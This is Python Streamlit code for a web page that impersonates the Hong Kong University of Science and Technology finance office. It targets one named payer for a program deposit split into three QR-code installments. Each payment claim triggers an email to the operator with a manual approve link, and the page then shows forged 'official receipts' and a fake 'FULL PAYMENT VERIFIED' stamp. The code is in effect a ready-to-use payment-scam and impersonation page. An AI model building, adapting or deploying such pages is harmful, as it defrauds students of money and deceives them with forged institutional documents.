import streamlit as st
from datetime import datetime
import time
import os
import requests

# --- 1. Page Config ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

STATUS_FILE = "payment_status.txt"

def set_status(status):
    with open(STATUS_FILE, "w") as f: f.write(status)
def get_status():
    if not os.path.exists(STATUS_FILE): return "pending"
    with open(STATUS_FILE, "r") as f: return f.read().strip()

# 管理員審核跳轉 (action=approve1, approve2, approve3)
query_params = st.query_params
action = query_params.get("action")
if action in ["approve1", "approve2", "approve3"]:
    set_status(action.replace("approve", "approved"))
    st.success(f"Stage {action[-1]} Payment Confirmed! User screen will update.")
    st.stop()

st.markdown("""
<style>
    #MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
    [data-testid="stHeader"] {display: none !important;}
    .nav-bar { background-color: #003366; padding: 15px 60px; display: flex; align-items: center; color: white; border-bottom: 4px solid #A6937C; }
    .loader { border: 6px solid #f3f3f3; border-top: 6px solid #003366; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .payment-card { background: white; padding: 30px; border-radius: 10px; border: 1px solid #ddd; color: #000 !important; }
    .info-box { background-color: #fffbe6; border: 1px solid #ffe58f; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; color: #856404; }
    .receipt-box { background: white; border: 1px solid #003366; padding: 30px; border-radius: 5px; color: #000 !important; }
</style>
""", unsafe_allow_html=True)

# --- 2. Data Definitions ---
PAYER = "XINGSHENG WANG (王兴生)"
HKD_TOTAL = "51,643"
USD_TOTAL = "6,593.21"

# EmailJS Config (請填入您的 Public Key, Service ID, Template ID)
USER_ID = "您的_Public_Key"
SERVICE_ID = "您的_Service_ID"
TEMPLATE_ID = "您的_Template_ID"
MY_URL = "https://streamlit.app" # 您的網站網址

# --- 3. UI State ---
if 'step' not in st.session_state: st.session_state.step = "pay1"

st.markdown(f"""<div class="nav-bar"><img src="https://hkust.edu.hk" height="45"><div style="margin-left:15px; border-left:2px solid #fff; padding-left:15px;">Deposit System</div></div>""", unsafe_allow_html=True)

# --- 4. Logic Flow ---

# --- 通用 Checking 頁面邏輯 ---
if st.session_state.step.startswith("checking"):
    stage = st.session_state.step[-1]
    st.markdown(f"""<div style="text-align:center; margin-top:100px;"><div class="loader"></div><h2 style="color:#003366;">Verifying Installment {stage}...</h2><p>The Finance Office is verifying your transaction. This page will update automatically.</p></div>""", unsafe_allow_html=True)
    time.sleep(5)
    if get_status() == f"approved{stage}":
        st.session_state.step = f"receipt{stage}"
    st.rerun()

# --- 第一階段：支付 1200 USD ---
elif st.session_state.step == "pay1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3>Payment Plan Confirmation</h3><p>Your deposit of <b>HK$ {HKD_TOTAL}</b> (≈ <b>USD {USD_TOTAL}</b>) will be split into 3 installments.</p>
        <div class="info-box"><b>Plan:</b> 1st: $1,200 | 2nd: $3,000 | 3rd: $2,393.21</div>
        <p style="text-align:center; font-weight:bold; color:#d32f2f;">Current: 1st Installment - USD 1,200.00</p></div>""", unsafe_allow_html=True)
        st.image("qr1.png", width=350)
        if st.button("I HAVE PAID THE 1ST INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 1200", "approve_url": f"{MY_URL}/?action=approve1"}})
            set_status("checking1"); st.session_state.step = "checking1"; st.rerun()

# --- 第一階段收據 & 進入第二階段 ---
elif st.session_state.step == "receipt1":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box"><h4 style="text-align:center;">OFFICIAL RECEIPT (STAGE 1)</h4><p><b>Payer:</b> {PAYER}</p><p><b>Amount Paid:</b> USD 1,200.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold;">VERIFIED</div></div>""", unsafe_allow_html=True)
        if st.button("PROCEED TO 2ND INSTALLMENT (USD 3,000)", use_container_width=True, type="primary"):
            st.session_state.step = "pay2"; st.rerun()

# --- 第二階段：支付 3000 USD ---
elif st.session_state.step == "pay2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366;">2nd Installment: USD 3,000.00</h3><p>Please scan the code below for the second part of your deposit.</p></div>""", unsafe_allow_html=True)
        st.image("qr2.png", width=350)
        if st.button("I HAVE PAID THE 2ND INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 3000", "approve_url": f"{MY_URL}/?action=approve2"}})
            set_status("checking2"); st.session_state.step = "checking2"; st.rerun()

# --- 第二階段收據 & 進入第三階段 ---
elif st.session_state.step == "receipt2":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="receipt-box"><h4 style="text-align:center;">OFFICIAL RECEIPT (STAGE 2)</h4><p><b>Payer:</b> {PAYER}</p><p><b>Amount Paid:</b> USD 3,000.00</p><div style="border:2px solid #28a745; color:#28a745; padding:5px; width:fit-content; font-weight:bold;">VERIFIED</div></div>""", unsafe_allow_html=True)
        if st.button("PROCEED TO FINAL INSTALLMENT (USD 2,393.21)", use_container_width=True, type="primary"):
            st.session_state.step = "pay3"; st.rerun()

# --- 第三階段：支付 2393.21 USD ---
elif st.session_state.step == "pay3":
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""<div class="payment-card"><h3 style="color:#003366;">Final Installment: USD 2,393.21</h3><p>Final payment to complete your MSc in TLE program deposit.</p></div>""", unsafe_allow_html=True)
        st.image("qr3.png", width=350)
        if st.button("I HAVE PAID THE FINAL INSTALLMENT", use_container_width=True, type="primary"):
            requests.post("https://emailjs.com", json={"service_id": SERVICE_ID, "template_id": TEMPLATE_ID, "user_id": USER_ID, "template_params": {"payer_name": PAYER, "amount": "USD 2393.21", "approve_url": f"{MY_URL}/?action=approve3"}})
            set_status("checking3"); st.session_state.step = "checking3"; st.rerun()

# --- 最終正式大收據 ---
elif st.session_state.step == "receipt3":
    st.markdown(f"""<div style="background:white; border:2px solid #003366; padding:40px; max-width:750px; margin:auto; position:relative;"><div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;"><h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2><p style="font-size:11px; color:#666 !important;">Finance Office | Official Receipt</p></div><h3 style="text-align:center; text-decoration: underline;">FULL PROGRAM DEPOSIT RECEIPT</h3><br><table style="width:100%; color:#000;"><tr><td><b>Receipt No:</b></td><td style="text-align:right;">UST-FINAL-{int(time.time())}</td></tr><tr><td><b>Received from:</b></td><td style="text-align:right;">{PAYER}</td></tr><tr><td><b>Total Amount:</b></td><td style="text-align:right;"><b>HK$ 51,643 (USD 6,593.21)</b></td></tr></table><br><div style="border:2px solid #d32f2f; color:#d32f2f; padding:8px; width:fit-content; transform:rotate(-5deg); font-weight:bold;">HKUST FINANCE OFFICE<br>FULL PAYMENT VERIFIED</div></div>""", unsafe_allow_html=True)
    st.balloons()
